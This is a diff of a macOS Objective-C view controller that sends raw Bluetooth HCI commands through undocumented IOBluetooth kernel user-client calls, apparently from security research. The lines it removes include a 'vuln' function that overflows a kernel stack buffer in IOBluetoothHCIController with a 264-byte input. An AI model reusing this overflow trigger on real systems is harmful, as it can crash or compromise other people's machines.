@@ -7,10 +7,9 @@
 //
 
 #import "ViewController.h"
-#import <IOBluetooth/IOBluetooth.h>
 #import "IOBluetoothHostController.h"
 @import IOKit;
-#import <IOKit/IOKitLib.h>
+@import IOBluetooth;
 
 struct BluetoothCall {
     uint64_t args[7];
@@ -26,15 +25,13 @@ struct HCIRequest {
     uint32 identifier;
 };
 
-/* Host Controller and Baseband */
-#define OGF_HOST_CTL        0x03
+@interface ViewController ()
 
-#define OCF_READ_CONN_ACCEPT_TIMEOUT    0x0015
-typedef struct {
-    uint8_t        status;
-    uint16_t    timeout;
-} __attribute__ ((packed)) read_conn_accept_timeout_rp;
-#define READ_CONN_ACCEPT_TIMEOUT_RP_SIZE 3
+@property (nonatomic, weak) IBOutlet NSTextField *addressLabel;
+
+@property (nonatomic, weak) IBOutlet NSTextField *messageLabel;
+
+@end
 
 @implementation ViewController
 
@@ -45,33 +42,14 @@ typedef struct {
     
     NSString *address = [hciController addressAsString];
     
-    NSLog(@"Address: %@ %@", address, hciController.className);
+    NSString *addressMessage = [NSString stringWithFormat:@"Address: %@ %@", address, hciController.className];
     
-    [self readConnectionTimeout:nil];
+    NSLog(@"%@", addressMessage);
+    
+    self.addressLabel.stringValue = addressMessage;
+    
+    //[self readConnectionTimeout:nil];
     //[self writeName:nil];
-    
-    /*
-    unsigned int createRequestError = [hciController requestWithTimeout:0x1770 isSynchronous:YES device:0x0];
-    
-    if (createRequestError) {
-        
-        printf("Error: %08x\n", createRequestError);
-    }*/
-    
-    // send HCI command
-    //error = BluetoothHCIDispatchUserClientRoutine(&output1, &outputHCI, &outputSize);
-    
-    // end HCI command
-    //error = BluetoothHCIDispatchUserClientRoutine(&a, 0x0, 0x0);
-    
-    /*
-     if (error) {
-     
-     NSLog(@"Error %@", @(error));
-     return;
-     }*/
-    
-    //NSLog(@"BluetoothHCIReadConnectionAcceptTimeout %@", @(outputHCI));
 }
 
 - (void)setRepresentedObject:(id)representedObject {
@@ -80,7 +58,7 @@ typedef struct {
     // Update the view, if already loaded.
 }
 
-- (void)readConnectionTimeout:(id)sender {
+- (IBAction)readConnectionTimeout:(id)sender {
     
     _IOBluetoothHostController *hciController = [IOBluetoothHostController defaultController];
     
@@ -119,7 +97,7 @@ typedef struct {
     command[1] = 0x0C;
     command[2] = 0;
     
-    error = _BluetoothHCISendRawCommand(request, command, 3);
+    error = _BluetoothHCISendRawCommand(request, command, 3, &output, outputSize);
     
     if (error) {
         
@@ -131,10 +109,14 @@ typedef struct {
     
     BluetoothHCIRequestDelete(request);
     
-    NSLog(@"BluetoothHCIReadConnectionAcceptTimeout %@", @(output));
+    NSString *message = [NSString stringWithFormat:@"BluetoothHCIReadConnectionAcceptTimeout %@", @(output)];
+    
+    NSLog(@"%@", message);
+    
+    self.messageLabel.stringValue = message;
 }
 
-- (void)writeName:(id)sender {
+- (IBAction)writeName:(id)sender {
     
     _IOBluetoothHostController *hciController = [IOBluetoothHostController defaultController];
     
@@ -152,7 +134,7 @@ typedef struct {
         return;
     }
     
-    NSLog(@"BluetoothHCIWriteLocalName");
+    NSLog(@"BluetoothHCIWriteLocalName: CDA");
     
     // manually
     
@@ -188,34 +170,21 @@ typedef struct {
     sleep(0x1);
     
     BluetoothHCIRequestDelete(request);
+    
+    NSString *message = @"BluetoothHCIWriteLocalName: ABC";
+    
+    NSLog(@"%@", message);
+    
+    self.messageLabel.stringValue = message;
 }
-
 
 @end
 
-
-/*
-int __sendRawHCIRequest(int arg0, int arg1, int arg2, int arg3) {
-    var_8 = arg0;
-    var_10 = arg1;
-    var_18 = arg2;
-    var_20 = arg3;
-    var_A0 = 0x4;
-    var_A8 = 0x198f;
-    var_98 = &var_A8;
-    var_24 = _BluetoothHCIDispatchUserClientRoutine(&var_98, &var_A4, &var_A0);
-    if (sign_extend_64((0x0 != var_24 ? 0x1 : 0x0) & 0x1 & 0xff) == 0x0) {
-        var_98 = &var_A4;
-        var_24 = _BluetoothHCIDispatchUserClientRoutine(&var_98, var_18, var_20);
-        var_98 = &var_A4;
-        _BluetoothHCIDispatchUserClientRoutine(&var_98, 0x0, 0x0);
-    }
-    rax = var_24;
-    return rax;
-}
-*/
-
-int _BluetoothHCISendRawCommand(struct HCIRequest request, void *commandData, size_t commmandSize) {
+int _BluetoothHCISendRawCommand(struct HCIRequest request,
+                                void *commandData,
+                                size_t commmandSize,
+                                void *returnParameter,
+                                size_t returnParameterSize) {
     
     int errorCode = 0;
     
@@ -225,18 +194,17 @@ int _BluetoothHCISendRawCommand(struct HCIRequest request, void *commandData, si
     
     if ((commandData != 0x0) && (commmandSize > 0x0)) {
         
+        // IOBluetoothHostController::
+        // SendRawHCICommand(unsigned int, char*, unsigned int, unsigned char*, unsigned int)
         call.args[0] = (uintptr_t)&request.identifier;
         call.args[1] = (uintptr_t)commandData;
         call.args[2] = (uintptr_t)&commmandSize;
-        call.sizes[0] = 0x04;
-        call.sizes[1] = 0x03;
-        call.sizes[2] = 0x08;
+        call.sizes[0] = sizeof(uint32);
+        call.sizes[1] = commmandSize;
+        call.sizes[2] = sizeof(uintptr_t);
         call.index = 0x000060c000000062;
-        //call = (struct BluetoothCallB)&request; //var_90 = &var_8;
         
-        // IOBluetoothHostController::
-        // SendRawHCICommand(unsigned int, char*, unsigned int, unsigned char*, unsigned int)
-        errorCode = BluetoothHCIDispatchUserClientRoutine(&call, 0x0, 0x0);
+        errorCode = BluetoothHCIDispatchUserClientRoutine(&call, returnParameter, &returnParameterSize);
     }
     else {
         errorCode = 0xe00002c2;
@@ -244,57 +212,3 @@ int _BluetoothHCISendRawCommand(struct HCIRequest request, void *commandData, si
     
     return errorCode;
 }
-
-int vuln(void) {
-    
-    /* Finding vuln service */
-    io_service_t service =
-    IOServiceGetMatchingService(kIOMasterPortDefault,
-                                IOServiceMatching("IOBluetoothHCIController"));
-    
-    if (!service) {
-        return -1;
-    }
-    
-    /* Connect to vuln service */
-    io_connect_t port = (io_connect_t) 0;
-    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &port);
-    IOObjectRelease(service);
-    if (kr != kIOReturnSuccess) {
-        return kr;
-    }
-    
-    printf(" [+] Opened connection to service on port: %d\n", port);
-    
-    struct BluetoothCall a;
-    
-    a.sizes[0] = 0x1000;
-    a.args[0] = (uint64_t) calloc(a.sizes[0], sizeof(char));
-    
-    /* This arguments overflows a local buffer and the adjacent stack canary */
-    a.sizes[1] = 264;
-    a.args[1] = (uint64_t) calloc(a.sizes[1], sizeof(char));
-    memset((void *)a.args[1], 'A', a.sizes[1]);
-    
-    /* Call IOBluetoothHCIUserClient::DispatchHCIReadLocalName() */
-    a.index = 0x2d;
-    
-    /* Debug */
-    for(int i = 0; i < 120; i++) {
-        if(i % 8 == 0) printf("\n");
-        printf("\\x%02x", ((unsigned char *)&a)[i]);
-    }
-    printf("\n");
-    fflush(stdout);
-    
-    kr = IOConnectCallMethod((mach_port_t) port, /* Connection */
-                             (uint32_t) 0,       /* Selector */
-                             NULL, 0,           /* input, inputCnt */
-                             (const void*) &a,   /* inputStruct */
-                             sizeof(a),           /* inputStructCnt */
-                             NULL, NULL, NULL, NULL); /* Output stuff */
-    printf("kr: %08x\n", kr);
-    
-    return IOServiceClose(port);
-}
-
